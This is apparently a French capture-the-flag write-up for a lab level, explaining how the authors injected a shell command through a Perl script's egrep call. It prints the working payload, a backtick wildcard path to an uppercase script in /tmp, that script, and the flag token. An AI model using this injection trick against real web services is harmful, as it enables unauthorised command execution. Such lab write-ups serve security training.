On se connecte au level12.

Avec `ls`, on remarque un fichier perl.

On décide de l'ouvrir.

On voit qu'il y a un un commentaire qui nous indique localhost:4646.

Avec notre navigateur, on charge la page et on voit seulement 2 points.

On comprends que la page va nous permettre de dialoguer avec le fichier puisque qu'en bas du fichier on voit la condition pour afficher les points sur la page.

Assez rapidement, on comprend qu'il s'agit du même principe que le level précédent, on va pouvoir injecter du code dans la fonction au niveau du egrep.

Le problème prinicpal est d'arriver au egrep sans avoir subit de modification. En effet,   

```
$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
```

transforme notre input en mettant d'une part tout en majuscule et d'autre effectue une modification au niveau des espaces que nous n'avons pas su clairement identifier.

Nous avons donc eu l'idée de mettre nos commandes dans un fichier en majuscule.

Nous avons donc créé le fichier YOLO.

```
#!/bin/sh
getflag | wall
```

On utilise
```
chmod +x /tmp/YOLO
```

Il nous fallait donc le passer en arguement. Sauf que nous ne pouvions pas mettre de chemin réel. Nous avons donc eu l'idée de mettre notre script dans le /tmp et de passer en argument une wildcard.

```
http://192.168.56.101:4646/?x="`/*/YOLO`"
```

En faisant ceci, le serveur a envoyé un message global avec le resultat de la commande
```
Broadcast Message from flag12@Snow
        (somewhere) at 13:31 ...
```
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

